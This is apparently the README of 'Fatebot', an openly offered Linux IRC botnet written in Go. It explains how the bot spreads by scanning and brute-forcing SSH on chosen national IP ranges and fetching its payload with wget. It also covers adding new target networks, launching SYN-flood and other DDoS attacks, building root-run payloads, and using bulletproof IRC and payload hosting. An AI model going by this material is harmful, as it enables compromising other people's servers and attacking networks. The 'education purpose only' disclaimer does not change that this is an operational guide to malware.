<p align="center">
	<a href="https://github.com/boz3r/Fatebot">
		<img src="assets/fatebot.png" alt="fatebot" width="440" height="440">
	</a>
	<br>
	<a href="https://github.com/boz3r/Fatebot/blob/master/LICENSE">
		<img src="https://img.shields.io/badge/license-Unlicense-red?style=plastic">
	</a>
	<a href="https://github.com/boz3r/Fatebot/releases">
    		<img src="https://img.shields.io/badge/version-v0.7.4-lightgrey?style=plastic">
	</a>
	<a href="https://go.dev/">
    		<img src="https://img.shields.io/badge/language-Go-red?style=plastic">
	</a>
	<a href="https://en.wikipedia.org/wiki/Linux">
    		<img src="https://img.shields.io/badge/platform-linux-lightgrey?style=plastic">
	</a>
  	</br>
</p>

<p align="center">
	<b><ins>⚠️ DISCLAIMER ⚠️</ins></b>
	<br>
	Bozer\Bulldozer (old name is R4bin) the author of Fatebot.
	<br>
	I have created this for education purpose only, the use of this software is your responsibility!!!
	<br>
</p>

---

# Spread Feature
Spread feature of this bot is scan on default SSH port and it will infect on linux only. Option about scan feature in this bot is scan on CN, HK, KR and BR network or you can do a random scan or even you can add you own mods, all of these it's up to you. This bot will brute-force attack to the target and use "wget" for download the payload from FTP server or any option any server type that you can host the payload not maintionly to be an FTP server.
	
	# How to add more scanner network (create your own scan mod).
	
	1) Go to scanner.go file and add a new slice for your scan network.
	
		# Example:
			
			var ItalyNetwork = []string {
				"123.456", //123.456.0.0/16
			}
			
			# since v0.6.0 will be use only 16 bit of the ip range (I'm still confused about subnet mask lol).
			
	2) Go to header.go file and scroll down to the map name "ScanMap".
	3) Custom your key and value. The value of map is structure, so you need to call a value in "Bot" structure and fill it.
	
		# Example:
		
			"-it": {				 # This key will be the command of a network arg in "?scan" command. "it" is short form italy.
				scanNetwork: ItalyNetwork, 	 # Fill the "scanNetwork" that's a value of "Bot" structure. To your network slice.
				isRandom:    false,		 # Set "isRandom" to false because it's not a full random network.
			},
	
	4) Done... just save it.
	
# Attack Feature
Attack feature will play around with transport layer mostly, but also have an application and network layer too.
All of the attack vectors except "http" DDoS vectors will be random source port and windows size automatically but dst port will let bot herder config by them self.

	# tcp -syn 127.0.0.1 192.168.50.129 -r 100 //command that's used in this screenshot.

<img src="assets/synflood.png" alt="synflood, dos example">

# IRC Commands
	
	cat irc/commands.txt 
	
	# I have move irc commands from github repositories to commands.txt file.

# Build Payload

	chmod +x build.sh
	./build.sh <payload>
	
	# Bot system arch is up to your compile system arch. 
	# If you compile your payload by x86, the bot that you have scaned will be only x86.
	# To run the payload you need to run with root access!!!

# Requirements
<ul>
	<li>x2 Bulletproof IRC Server (Recommend x2 in case for handle a lot of connections or your server is a low spec)</li>
</ul>

<ul>
	<li>x1 Bulletproof IRC Backup Server (Optional)</li>
</ul>

<ul>
	<li>x1 Payload Hosting Server (If it is a bulletproof hosting. It will be great for your self)</li>
</ul>

<ul>
	<li>IRC Client</li>
</ul>

<ul>
	<li>Go Compiler</li>
</ul>

<ul>
	<li>UPX Packer</li>
</ul>

<ul>
	<li>Code\Text Editor</li>
</ul>
